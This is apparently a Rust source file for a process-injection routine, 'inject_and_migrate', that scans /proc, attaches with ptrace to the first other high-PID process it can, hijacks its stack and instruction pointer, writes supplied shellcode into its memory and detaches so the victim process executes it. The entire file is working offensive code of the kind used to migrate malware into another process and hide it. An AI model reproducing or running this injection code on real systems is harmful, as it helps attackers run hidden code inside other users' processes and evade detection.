extern crate nix;
use nix::sys::ptrace::{attach, detach, getregs, setregs, write};
use nix::sys::wait::waitpid;
use nix::unistd::Pid;
use std::process::{self, Command};
use std::ffi::c_void;
use std::cmp;

pub fn inject_and_migrate(shellcode: &[u8]) {
    println!("Shellcode len: {}", shellcode.len());
    let mut target_pid = 0;
    let list_pids = Command::new("ls")
            .arg("/proc/")
            .output()
            .unwrap();
    let mut pids: Vec<i32> = String::from_utf8(list_pids.stdout)
                                                        .unwrap()
                                                        .split('\n')
                                                        .flat_map(|s| s.parse().ok())
                                                        .collect();
    pids.retain(|i| *i > 1000 && *i != process::id() as i32);
    //pids.sort();
    for pid in pids.iter().rev() {
        if let Ok(_) = attach(Pid::from_raw(*pid)) {
            target_pid = *pid;
            break;
        };
    }
    if target_pid == 0 {
        panic!("Could not find a process whose memory can be manipulated");
    }
    println!("Target PID: {:?}", target_pid);
    let target_pid = Pid::from_raw(target_pid);
    if let Err(error) = waitpid(target_pid, None) {
        panic!("Could not wait for target process to change state: {}", error);
    }
    let mut registers = match getregs(target_pid) {
        Err(error) => panic!("Could not get registers for target process: {}", error),
        Ok(value) => value
    };
    println!("{:?}", registers);
    registers.rsp -= 4;
    println!("{:?}", registers);
    if let Err(error) = unsafe { write(target_pid, registers.rsp as *mut c_void, registers.rip as *mut c_void) }{
        panic!("Unable to write RIP to RSP in target process: {}", error);
    }
    let mut point = registers.rsp - 1024;
    registers.rip = registers.rsp - 1022;
    if let Err(error) = setregs(target_pid, registers) {
        panic!("Unable to reset target process registers: {}", error);
    }
    let mut index = 0;
    while index < shellcode.len() {
        let slice = &shellcode[index..];
        //println!("{:?}", slice);
        if let Err(error) = unsafe { write(target_pid, point as *mut c_void, slice.as_ptr() as *mut c_void) } {
            panic!("Unable to portion of shellcode at {} to target process: {}", index, error);
        }
        index += 4;
        point += 4;
    }

    if let Err(error) = detach(target_pid, None) {
        panic!("Unable to detach from target process: {}", error);
    }
    println!("DONE?");
}
